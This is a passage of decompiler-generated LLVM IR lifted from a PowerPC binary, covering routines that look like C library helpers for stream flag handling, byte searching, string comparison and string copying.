dec_label_pc_1000b804:                            ; preds = %dec_label_pc_1000b7e4, %dec_label_pc_1000b7c8, %dec_label_pc_1000b7c0, %dec_label_pc_1000b79c, %dec_label_pc_1000b7fc
  %v0_1000b828 = phi i32 [ %v1_1000b7f4, %dec_label_pc_1000b7e4 ], [ %v1_1000b7c0, %dec_label_pc_1000b7c8 ], [ 0, %dec_label_pc_1000b7c0 ], [ 0, %dec_label_pc_1000b79c ], [ %v2_1000b800, %dec_label_pc_1000b7fc ]
  %v1_1000b804 = and i32 %v4_1000b7b4, 64
  %v3_1000b804 = icmp eq i32 %v1_1000b804, 0
  %storemerge.in.in.v = select i1 %v3_1000b804, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_1000b818 = add i32 %tmp, 16
  %v3_1000b818 = inttoptr i32 %v2_1000b818 to i32*
  %v4_1000b818 = load i32, i32* %v3_1000b818, align 4
  %v1_1000b81c = inttoptr i32 %arg2 to i32*
  %v2_1000b81c = load i32, i32* %v1_1000b81c, align 4
  store i32 %v2_1000b81c, i32* %r4.global-to-local, align 4
  %v1_1000b820 = add i32 %arg2, 4
  %v2_1000b820 = inttoptr i32 %v1_1000b820 to i32*
  %v3_1000b820 = load i32, i32* %v2_1000b820, align 4
  store i32 %v3_1000b820, i32* %r5.global-to-local, align 4
  %v2_1000b824 = sub i32 %storemerge, %v4_1000b818
  %v2_1000b828 = add i32 %v2_1000b824, %v0_1000b828
  store i32 %v2_1000b828, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_1000b828, 0
  %v1_1000b830 = zext i1 %tmp10 to i32
  %v2_1000b830 = ashr i32 %v2_1000b828, 31
  %v3_1000b830 = and i32 %v2_1000b830, -2
  %v4_1000b830 = or i32 %v3_1000b830, %v1_1000b830
  %v2_1000b834 = sub i32 %v3_1000b820, %v2_1000b828
  %v3_1000b834 = sub i32 -1, %v2_1000b828
  store i32 %v2_1000b834, i32* %r10.global-to-local, align 4
  %v6_1000b834 = icmp ule i32 %v2_1000b834, %v3_1000b834
  %v2_1000b838 = sub nsw i32 -1, %v4_1000b830
  %v3_1000b838 = add i32 %v2_1000b81c, %v2_1000b838
  %v5_1000b838 = zext i1 %v6_1000b834 to i32
  %v6_1000b838 = add i32 %v3_1000b838, %v5_1000b838
  store i32 %v6_1000b838, i32* %v1_1000b81c, align 4
  %v0_1000b840 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000b840 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000b840 = add i32 %v1_1000b840, 4
  %v3_1000b840 = inttoptr i32 %v2_1000b840 to i32*
  store i32 %v0_1000b840, i32* %v3_1000b840, align 4
  %v0_1000b844 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000b844 = inttoptr i32 %v0_1000b844 to i32*
  %v2_1000b844 = load i32, i32* %v1_1000b844, align 4
  %v1_1000b848 = load i32, i32* %r4.global-to-local, align 4
  %v3_1000b848 = icmp sgt i32 %v2_1000b844, %v1_1000b848
  br i1 %v3_1000b848, label %dec_label_pc_1000b860, label %dec_label_pc_1000b850

dec_label_pc_1000b850:                            ; preds = %dec_label_pc_1000b804
  %v4_1000b848 = icmp eq i32 %v2_1000b844, %v1_1000b848
  br i1 %v4_1000b848, label %dec_label_pc_1000b854, label %dec_label_pc_1000b864thread-pre-split

dec_label_pc_1000b854:                            ; preds = %dec_label_pc_1000b850
  %v1_1000b854 = add i32 %v0_1000b844, 4
  %v2_1000b854 = inttoptr i32 %v1_1000b854 to i32*
  %v3_1000b854 = load i32, i32* %v2_1000b854, align 4
  %v1_1000b858 = load i32, i32* %r5.global-to-local, align 4
  %v3_1000b858 = icmp ugt i32 %v3_1000b854, %v1_1000b858
  br i1 %v3_1000b858, label %dec_label_pc_1000b860, label %dec_label_pc_1000b864thread-pre-split

dec_label_pc_1000b860:                            ; preds = %dec_label_pc_1000b854, %dec_label_pc_1000b804
  %v0_1000b860 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000b860 = sub i32 0, %v0_1000b860
  store i32 %v1_1000b860, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b864

dec_label_pc_1000b864thread-pre-split:            ; preds = %dec_label_pc_1000b850, %dec_label_pc_1000b854
  %v0_1000b864.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b864

dec_label_pc_1000b864:                            ; preds = %dec_label_pc_1000b864thread-pre-split, %dec_label_pc_1000b860
  %v0_1000b864 = phi i32 [ %v0_1000b864.pr, %dec_label_pc_1000b864thread-pre-split ], [ %v1_1000b860, %dec_label_pc_1000b860 ]
  %tmp8 = icmp sgt i32 %v0_1000b864, -1
  br i1 %tmp8, label %dec_label_pc_1000b880, label %dec_label_pc_1000b86c

dec_label_pc_1000b86c:                            ; preds = %dec_label_pc_1000b864
  %v0_1000b86c = call i32 @function_10004b48()
  %v2_1000b874 = inttoptr i32 %v0_1000b86c to i32*
  store i32 75, i32* %v2_1000b874, align 4
  %v0_1000b884.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b880

dec_label_pc_1000b87c:                            ; preds = %dec_label_pc_1000b7d8, %dec_label_pc_1000b7d0
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b880

dec_label_pc_1000b880:                            ; preds = %dec_label_pc_1000b864, %dec_label_pc_1000b86c, %dec_label_pc_1000b87c
  %v0_1000b884 = phi i32 [ %v0_1000b864, %dec_label_pc_1000b864 ], [ %v0_1000b884.pre, %dec_label_pc_1000b86c ], [ -1, %dec_label_pc_1000b87c ]
  ret i32 %v0_1000b884

; uselistorder directives
  uselistorder i32 %v2_1000b844, { 1, 0 }
  uselistorder i32 %v2_1000b828, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000b880, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b864thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_1000b804, { 4, 0, 1, 2, 3 }
}

define i32 @function_1000b898(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000b898:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000b89c = load i32, i32* @lr, align 4
  store i32 %v0_1000b89c, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_1000b8ac = add i32 %arg1, 8
  %v2_1000b8ac = inttoptr i32 %v1_1000b8ac to i32*
  %v3_1000b8ac = load i32, i32* %v2_1000b8ac, align 4
  %v1_1000b8b0 = add i32 %arg1, 12
  %v2_1000b8b0 = inttoptr i32 %v1_1000b8b0 to i32*
  %v3_1000b8b0 = load i32, i32* %v2_1000b8b0, align 4
  %v2_1000b8b4 = sub i32 %v3_1000b8b0, %v3_1000b8ac
  store i32 268482748, i32* @lr, align 4
  %v3_1000b8b8 = inttoptr i32 %v3_1000b8ac to i16*
  %v4_1000b8b8 = call i32 @function_1000b728(i16* %v3_1000b8b8, i32 %v2_1000b8b4, i32 %v2_1000b8b4)
  %v0_1000b8bc = load i32, i32* @r29, align 4
  %v1_1000b8bc = add i32 %v0_1000b8bc, 8
  %v2_1000b8bc = inttoptr i32 %v1_1000b8bc to i32*
  %v3_1000b8bc = load i32, i32* %v2_1000b8bc, align 4
  %v2_1000b8c0 = add i32 %v3_1000b8bc, %v4_1000b8b8
  store i32 %v2_1000b8c0, i32* %r0.global-to-local, align 4
  %v2_1000b8c4 = add i32 %v0_1000b8bc, 16
  %v3_1000b8c4 = inttoptr i32 %v2_1000b8c4 to i32*
  store i32 %v3_1000b8bc, i32* %v3_1000b8c4, align 4
  %v0_1000b8c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b8c8 = load i32, i32* @r29, align 4
  %v2_1000b8c8 = add i32 %v1_1000b8c8, 20
  %v3_1000b8c8 = inttoptr i32 %v2_1000b8c8 to i32*
  store i32 %v0_1000b8c8, i32* %v3_1000b8c8, align 4
  store i32 %v0_1000b89c, i32* %r0.global-to-local, align 4
  ret i32 %v4_1000b8b8

; uselistorder directives
  uselistorder i32 %v3_1000b8bc, { 1, 0 }
  uselistorder i32 %v4_1000b8b8, { 1, 0 }
  uselistorder i32 %v3_1000b8ac, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_1000b8e0(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000b8e0:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_1000b8e8 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000b8f4 = load i16, i16* %arg1, align 2
  %v4_1000b8f4 = zext i16 %v3_1000b8f4 to i32
  %v2_1000b8f8 = and i32 %v4_1000b8f4, %arg2
  %v5_1000b8f8 = icmp eq i32 %v2_1000b8f8, 0
  br i1 %v5_1000b8f8, label %dec_label_pc_1000b900, label %dec_label_pc_1000b910

dec_label_pc_1000b900:                            ; preds = %dec_label_pc_1000b8e0
  %v1_1000b900 = and i32 %v4_1000b8f4, 2176
  %v3_1000b900 = icmp eq i32 %v1_1000b900, 0
  br i1 %v3_1000b900, label %dec_label_pc_1000b908, label %dec_label_pc_1000b91c

dec_label_pc_1000b908:                            ; preds = %dec_label_pc_1000b900
  %v2_1000b908 = or i32 %v4_1000b8f4, %arg2
  %v1_1000b90c = trunc i32 %v2_1000b908 to i16
  store i16 %v1_1000b90c, i16* %arg1, align 2
  %v0_1000b910.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b910

dec_label_pc_1000b910:                            ; preds = %dec_label_pc_1000b8e0, %dec_label_pc_1000b908
  %v0_1000b910 = phi i32 [ %tmp, %dec_label_pc_1000b8e0 ], [ %v0_1000b910.pre, %dec_label_pc_1000b908 ]
  %v1_1000b910 = inttoptr i32 %v0_1000b910 to i16*
  %v2_1000b910 = load i16, i16* %v1_1000b910, align 2
  %v3_1000b910 = zext i16 %v2_1000b910 to i32
  %v1_1000b914 = and i32 %v3_1000b910, 16
  %v3_1000b914 = icmp eq i32 %v1_1000b914, 0
  br i1 %v3_1000b914, label %dec_label_pc_1000b938, label %dec_label_pc_1000b91c

dec_label_pc_1000b91c:                            ; preds = %dec_label_pc_1000b900, %dec_label_pc_1000b910
  %v0_1000b91c = call i32 @function_10004b48()
  store i32 %v0_1000b91c, i32* %r3.global-to-local, align 4
  %v2_1000b924 = inttoptr i32 %v0_1000b91c to i32*
  store i32 9, i32* %v2_1000b924, align 4
  br label %dec_label_pc_1000b928

dec_label_pc_1000b928:                            ; preds = %dec_label_pc_1000b940, %dec_label_pc_1000b91c
  %v0_1000b928 = load i32, i32* @r31, align 4
  %v1_1000b928 = inttoptr i32 %v0_1000b928 to i16*
  %v2_1000b928 = load i16, i16* %v1_1000b928, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000b930 = or i16 %v2_1000b928, 8
  br label %dec_label_pc_1000b96c

dec_label_pc_1000b938:                            ; preds = %dec_label_pc_1000b910
  %v1_1000b938 = and i32 %v3_1000b910, 64
  %v3_1000b938 = icmp eq i32 %v1_1000b938, 0
  br i1 %v3_1000b938, label %dec_label_pc_1000b960, label %dec_label_pc_1000b940

dec_label_pc_1000b940:                            ; preds = %dec_label_pc_1000b938
  store i32 268482884, i32* @lr, align 4
  %v0_1000b940 = call i32 @function_10005548()
  store i32 %v0_1000b940, i32* %r3.global-to-local, align 4
  %v3_1000b944 = icmp eq i32 %v0_1000b940, 0
  br i1 %v3_1000b944, label %dec_label_pc_1000b94c, label %dec_label_pc_1000b928

dec_label_pc_1000b94c:                            ; preds = %dec_label_pc_1000b940
  %v0_1000b94c = load i32, i32* @r31, align 4
  %v1_1000b94c = inttoptr i32 %v0_1000b94c to i16*
  %v2_1000b94c = load i16, i16* %v1_1000b94c, align 2
  %v3_1000b94c = zext i16 %v2_1000b94c to i32
  %v1_1000b950 = add i32 %v0_1000b94c, 8
  %v2_1000b950 = inttoptr i32 %v1_1000b950 to i32*
  %v3_1000b950 = load i32, i32* %v2_1000b950, align 4
  %v1_1000b954 = call i32 @__asm_rlwinm(i32 %v3_1000b94c, i32 0, i32 26, i32 24)
  %v2_1000b954 = trunc i32 %v1_1000b954 to i16
  %v1_1000b958 = load i32, i32* @r31, align 4
  %v2_1000b958 = add i32 %v1_1000b958, 28
  %v3_1000b958 = inttoptr i32 %v2_1000b958 to i32*
  store i32 %v3_1000b950, i32* %v3_1000b958, align 4
  %v3_1000b95c = load i32, i32* @r31, align 4
  %v4_1000b95c = inttoptr i32 %v3_1000b95c to i16*
  store i16 %v2_1000b954, i16* %v4_1000b95c, align 2
  %v0_1000b960.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b960

dec_label_pc_1000b960:                            ; preds = %dec_label_pc_1000b938, %dec_label_pc_1000b94c
  %v0_1000b960 = phi i32 [ %v0_1000b910, %dec_label_pc_1000b938 ], [ %v0_1000b960.pre, %dec_label_pc_1000b94c ]
  %v1_1000b960 = inttoptr i32 %v0_1000b960 to i16*
  %v2_1000b960 = load i16, i16* %v1_1000b960, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000b968 = or i16 %v2_1000b960, 1
  br label %dec_label_pc_1000b96c

dec_label_pc_1000b96c:                            ; preds = %dec_label_pc_1000b928, %dec_label_pc_1000b960
  %v2_1000b96c = phi i32 [ %v0_1000b928, %dec_label_pc_1000b928 ], [ %v0_1000b960, %dec_label_pc_1000b960 ]
  %storemerge.off0 = phi i16 [ %v1_1000b930, %dec_label_pc_1000b928 ], [ %v1_1000b968, %dec_label_pc_1000b960 ]
  %v3_1000b96c = inttoptr i32 %v2_1000b96c to i16*
  store i16 %storemerge.off0, i16* %v3_1000b96c, align 2
  store i32 %v0_1000b8e8, i32* @r31, align 4
  %v0_1000b980 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000b980

; uselistorder directives
  uselistorder i32 %v4_1000b8f4, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32 26, { 4, 1, 2, 3, 5, 6, 0 }
  uselistorder i32 ()* @function_10005548, { 8, 5, 2, 1, 4, 3, 7, 6, 0 }
  uselistorder i32 64, { 0, 4, 5, 6, 8, 1, 2, 7, 9, 3 }
  uselistorder i16 8, { 5, 0, 1, 2, 3, 4 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b96c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b960, { 1, 0 }
  uselistorder label %dec_label_pc_1000b91c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b910, { 1, 0 }
}

define i32 @function_1000b984(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b984:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_1000b988 = load i32, i32* @lr, align 4
  store i32 %v0_1000b988, i32* %r0.global-to-local, align 4
  %v0_1000b990 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_1000b99c = add i32 %arg1, 4
  %v2_1000b99c = inttoptr i32 %v1_1000b99c to i32*
  %v3_1000b99c = load i32, i32* %v2_1000b99c, align 4
  %v2_1000b9a0 = load i32, i32* %arg2, align 4
  %v1_1000b9a4 = add i32 %tmp, 4
  %v2_1000b9a4 = inttoptr i32 %v1_1000b9a4 to i32*
  %v3_1000b9a4 = load i32, i32* %v2_1000b9a4, align 4
  store i32 268482988, i32* @lr, align 4
  %v4_1000b9a8 = call i32 @function_1000c9ec(i32 %v3_1000b99c, i32 %v2_1000b9a0, i32 %v3_1000b9a4, i32 %arg3)
  %v1_1000b9ac = icmp slt i32 %v4_1000b9a8, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_1000b9ac, label %dec_label_pc_1000b9c4, label %dec_label_pc_1000b9b8

dec_label_pc_1000b9b8:                            ; preds = %dec_label_pc_1000b984
  %v1_1000b9b8 = load i32, i32* @r31, align 4
  %v2_1000b9b8 = inttoptr i32 %v1_1000b9b8 to i32*
  store i32 %v4_1000b9a8, i32* %v2_1000b9b8, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000b9c0 = load i32, i32* @r31, align 4
  %v2_1000b9c0 = add i32 %v1_1000b9c0, 4
  %v3_1000b9c0 = inttoptr i32 %v2_1000b9c0 to i32*
  store i32 %tmp, i32* %v3_1000b9c0, align 4
  %v0_1000b9c4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000b9c4

dec_label_pc_1000b9c4:                            ; preds = %dec_label_pc_1000b984, %dec_label_pc_1000b9b8
  %v0_1000b9c4 = phi i32 [ %tmp, %dec_label_pc_1000b984 ], [ %v0_1000b9c4.pre, %dec_label_pc_1000b9b8 ]
  store i32 %v0_1000b988, i32* %r0.global-to-local, align 4
  store i32 %v0_1000b990, i32* @r31, align 4
  ret i32 %v0_1000b9c4

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder label %dec_label_pc_1000b9c4, { 1, 0 }
}

define i32 @function_1000b9dc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b9dc:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000b9dc = urem i32 %arg1, 256
  store i32 %v1_1000b9dc, i32* %r4.global-to-local, align 4
  %v0_1000b9f41 = load i32, i32* @r3, align 4
  %v1_1000b9f42 = urem i32 %v0_1000b9f41, 4
  %v3_1000b9f44 = icmp eq i32 %v1_1000b9f42, 0
  br i1 %v3_1000b9f44, label %dec_label_pc_1000b9fc, label %dec_label_pc_1000b9e4

dec_label_pc_1000b9e4:                            ; preds = %dec_label_pc_1000b9dc, %dec_label_pc_1000b9e4
  %v1_1000b9e8 = phi i32 [ %v0_1000b9fc.pre, %dec_label_pc_1000b9e4 ], [ %v1_1000b9dc, %dec_label_pc_1000b9dc ]
  %v0_1000b9e4 = phi i32 [ %v1_1000b9f0, %dec_label_pc_1000b9e4 ], [ %v0_1000b9f41, %dec_label_pc_1000b9dc ]
  %v1_1000b9e4 = inttoptr i32 %v0_1000b9e4 to i8*
  %v2_1000b9e4 = load i8, i8* %v1_1000b9e4, align 1
  %v3_1000b9e4 = zext i8 %v2_1000b9e4 to i32
  %v4_1000b9e8 = icmp eq i32 %v3_1000b9e4, %v1_1000b9e8
  %v0_1000b9ec = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000b9e8, i32 %v0_1000b9ec)
  %v0_1000b9f0 = load i32, i32* @r3, align 4
  %v1_1000b9f0 = add i32 %v0_1000b9f0, 1
  store i32 %v1_1000b9f0, i32* @r3, align 4
  %v1_1000b9f4 = urem i32 %v1_1000b9f0, 4
  %v3_1000b9f4 = icmp eq i32 %v1_1000b9f4, 0
  %v0_1000b9fc.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000b9f4, label %dec_label_pc_1000b9fc, label %dec_label_pc_1000b9e4

dec_label_pc_1000b9fc:                            ; preds = %dec_label_pc_1000b9e4, %dec_label_pc_1000b9dc
  %v0_1000ba149 = phi i32 [ %v0_1000b9f41, %dec_label_pc_1000b9dc ], [ %v1_1000b9f0, %dec_label_pc_1000b9e4 ]
  %v0_1000b9fc = phi i32 [ %v1_1000b9dc, %dec_label_pc_1000b9dc ], [ %v0_1000b9fc.pre, %dec_label_pc_1000b9e4 ]
  %v1_1000b9fc = mul i32 %v0_1000b9fc, 256
  %v2_1000ba04 = or i32 %v1_1000b9fc, %v0_1000b9fc
  %v1_1000ba0c = mul i32 %v2_1000ba04, 65536
  %v2_1000ba10 = or i32 %v1_1000ba0c, %v2_1000ba04
  br label %dec_label_pc_1000ba14

dec_label_pc_1000ba14:                            ; preds = %dec_label_pc_1000ba80, %dec_label_pc_1000ba14, %dec_label_pc_1000b9fc
  %v0_1000ba50 = phi i32 [ %v0_1000ba149, %dec_label_pc_1000b9fc ], [ %v1_1000ba18, %dec_label_pc_1000ba14 ], [ %v1_1000ba18, %dec_label_pc_1000ba80 ]
  %v1_1000ba14 = inttoptr i32 %v0_1000ba50 to i32*
  %v2_1000ba14 = load i32, i32* %v1_1000ba14, align 4
  %v1_1000ba18 = add i32 %v0_1000ba50, 4
  %v2_1000ba20 = xor i32 %v2_1000ba14, %v2_1000ba10
  %v1_1000ba28 = add i32 %v2_1000ba20, 2130640639
  %v2_1000ba2c = xor i32 %v1_1000ba28, %v2_1000ba20
  %v1_1000ba30 = add i32 %v0_1000ba50, 1
  %v2_1000ba34 = and i32 %v2_1000ba2c, -2130640640
  %v6_1000ba34 = icmp eq i32 %v2_1000ba34, -2130640640
  br i1 %v6_1000ba34, label %dec_label_pc_1000ba14, label %dec_label_pc_1000ba3c

dec_label_pc_1000ba3c:                            ; preds = %dec_label_pc_1000ba14
  %v2_1000ba3c = inttoptr i32 %v0_1000ba50 to i8*
  %v3_1000ba3c = load i8, i8* %v2_1000ba3c, align 1
  %v4_1000ba3c = zext i8 %v3_1000ba3c to i32
  %v1_1000ba40 = add i32 %v0_1000ba50, 3
  %v1_1000ba44 = add i32 %v0_1000ba50, 2
  %v4_1000ba48 = icmp eq i32 %v4_1000ba3c, %v0_1000b9fc
  br i1 %v4_1000ba48, label %dec_label_pc_1000ba50, label %dec_label_pc_1000ba58

dec_label_pc_1000ba50:                            ; preds = %dec_label_pc_1000ba3c
  ret i32 %v0_1000ba50

dec_label_pc_1000ba58:                            ; preds = %dec_label_pc_1000ba3c
  %v2_1000ba58 = inttoptr i32 %v1_1000ba30 to i8*
  %v3_1000ba58 = load i8, i8* %v2_1000ba58, align 1
  %v4_1000ba58 = zext i8 %v3_1000ba58 to i32
  %v4_1000ba5c = icmp eq i32 %v4_1000ba58, %v0_1000b9fc
  br i1 %v4_1000ba5c, label %dec_label_pc_1000ba64, label %dec_label_pc_1000ba6c

dec_label_pc_1000ba64:                            ; preds = %dec_label_pc_1000ba58
  ret i32 %v1_1000ba30

dec_label_pc_1000ba6c:                            ; preds = %dec_label_pc_1000ba58
  %v2_1000ba6c = inttoptr i32 %v1_1000ba44 to i8*
  %v3_1000ba6c = load i8, i8* %v2_1000ba6c, align 1
  %v4_1000ba6c = zext i8 %v3_1000ba6c to i32
  %v4_1000ba70 = icmp eq i32 %v4_1000ba6c, %v0_1000b9fc
  br i1 %v4_1000ba70, label %dec_label_pc_1000ba78, label %dec_label_pc_1000ba80

dec_label_pc_1000ba78:                            ; preds = %dec_label_pc_1000ba6c
  ret i32 %v1_1000ba44

dec_label_pc_1000ba80:                            ; preds = %dec_label_pc_1000ba6c
  %v2_1000ba80 = inttoptr i32 %v1_1000ba40 to i8*
  %v3_1000ba80 = load i8, i8* %v2_1000ba80, align 1
  %v4_1000ba80 = zext i8 %v3_1000ba80 to i32
  %v4_1000ba84 = icmp eq i32 %v4_1000ba80, %v0_1000b9fc
  br i1 %v4_1000ba84, label %dec_label_pc_1000ba8c, label %dec_label_pc_1000ba14

dec_label_pc_1000ba8c:                            ; preds = %dec_label_pc_1000ba80
  ret i32 %v1_1000ba40

; uselistorder directives
  uselistorder i32 %v1_1000ba18, { 1, 0 }
  uselistorder i32 %v0_1000ba50, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_1000ba04, { 1, 0 }
  uselistorder i32 %v0_1000b9fc, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000b9f0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000b9f41, { 2, 1, 0 }
  uselistorder i32 %v1_1000b9dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000b9e4, { 1, 0 }
}

define i32 @function_1000ba94(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000ba94:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000baa0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000ba98

dec_label_pc_1000ba98:                            ; preds = %dec_label_pc_1000babc, %dec_label_pc_1000ba94
  %v0_1000baa0 = phi i32 [ %v1_1000baa4, %dec_label_pc_1000babc ], [ %v0_1000baa0.pre, %dec_label_pc_1000ba94 ]
  %v0_1000ba98 = phi i32 [ %v1_1000ba9c, %dec_label_pc_1000babc ], [ %tmp, %dec_label_pc_1000ba94 ]
  %v1_1000ba98 = inttoptr i32 %v0_1000ba98 to i8*
  %v2_1000ba98 = load i8, i8* %v1_1000ba98, align 1
  %v3_1000ba98 = zext i8 %v2_1000ba98 to i32
  %v1_1000baa0 = inttoptr i32 %v0_1000baa0 to i8*
  %v2_1000baa0 = load i8, i8* %v1_1000baa0, align 1
  %v3_1000baa0 = zext i8 %v2_1000baa0 to i32
  %v3_1000baa8 = icmp eq i8 %v2_1000ba98, 0
  br i1 %v3_1000baa8, label %dec_label_pc_1000bab4, label %dec_label_pc_1000babc

dec_label_pc_1000bab4:                            ; preds = %dec_label_pc_1000ba98
  %v1_1000bab4 = sub nsw i32 0, %v3_1000baa0
  ret i32 %v1_1000bab4

dec_label_pc_1000babc:                            ; preds = %dec_label_pc_1000ba98
  %v4_1000baac = icmp eq i8 %v2_1000ba98, %v2_1000baa0
  %v1_1000baa4 = add i32 %v0_1000baa0, 1
  %v1_1000ba9c = add i32 %v0_1000ba98, 1
  br i1 %v4_1000baac, label %dec_label_pc_1000ba98, label %dec_label_pc_1000bac0

dec_label_pc_1000bac0:                            ; preds = %dec_label_pc_1000babc
  %v2_1000bac0 = sub nsw i32 %v3_1000ba98, %v3_1000baa0
  ret i32 %v2_1000bac0

; uselistorder directives
  uselistorder i32 %v3_1000baa0, { 1, 0 }
  uselistorder i32 %v0_1000ba98, { 1, 0 }
  uselistorder i32 %v0_1000baa0, { 1, 0 }
}

define i32 @function_1000bac8(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000bac8:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000bacc

dec_label_pc_1000bacc:                            ; preds = %dec_label_pc_1000bacc, %dec_label_pc_1000bac8
  %v0_1000bacc = phi i32 [ %v1_1000bad0, %dec_label_pc_1000bacc ], [ %tmp, %dec_label_pc_1000bac8 ]
  %v1_1000bacc = inttoptr i32 %v0_1000bacc to i8*
  %v2_1000bacc = load i8, i8* %v1_1000bacc, align 1
  %v1_1000bad0 = add i32 %v0_1000bacc, 1
  store i32 %v1_1000bad0, i32* %r11.global-to-local, align 4
  %v3_1000bad4 = icmp eq i8 %v2_1000bacc, 0
  store i1 %v3_1000bad4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000bad4, label %dec_label_pc_1000badc, label %dec_label_pc_1000bacc

dec_label_pc_1000badc:                            ; preds = %dec_label_pc_1000bacc
  %v3_1000badc = icmp eq i32 %arg2, 3
  store i1 %v3_1000badc, i1* %cr7_eq.global-to-local, align 1
  %v1_1000bae0 = add i32 %v0_1000bacc, -1
  store i32 %v1_1000bae0, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_1000bb7c, label %dec_label_pc_1000baec

dec_label_pc_1000baec:                            ; preds = %dec_label_pc_1000badc
  %v1_1000baec = udiv i32 %arg2, 4
  store i32 %v1_1000baec, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000baf4

dec_label_pc_1000baf4:                            ; preds = %dec_label_pc_1000baf4.dec_label_pc_1000baf4_crit_edge, %dec_label_pc_1000baec
  %v2_1000bb04 = phi i32 [ %v0_1000baf8.pre, %dec_label_pc_1000baf4.dec_label_pc_1000baf4_crit_edge ], [ %v1_1000bae0, %dec_label_pc_1000baec ]
  %v0_1000baf4 = load i32, i32* @r4, align 4
  %v1_1000baf4 = inttoptr i32 %v0_1000baf4 to i8*
  %v2_1000baf4 = load i8, i8* %v1_1000baf4, align 1
  %v1_1000baf8 = add i32 %v2_1000bb04, 1
  store i32 %v1_1000baf8, i32* %r7.global-to-local, align 4
  %v1_1000bafc = add i32 %v0_1000baf4, 1
  store i32 %v1_1000bafc, i32* %r6.global-to-local, align 4
  %v3_1000bb00 = icmp eq i8 %v2_1000baf4, 0
  store i1 %v3_1000bb00, i1* %cr7_eq.global-to-local, align 1
  %v4_1000bb04 = inttoptr i32 %v1_1000baf8 to i8*
  store i8 %v2_1000baf4, i8* %v4_1000bb04, align 1
  %v0_1000bb08 = load i32, i32* @lr, align 4
  %v1_1000bb08 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000bb08, i32 %v0_1000bb08)
  %v0_1000bb0c = load i32, i32* @r4, align 4
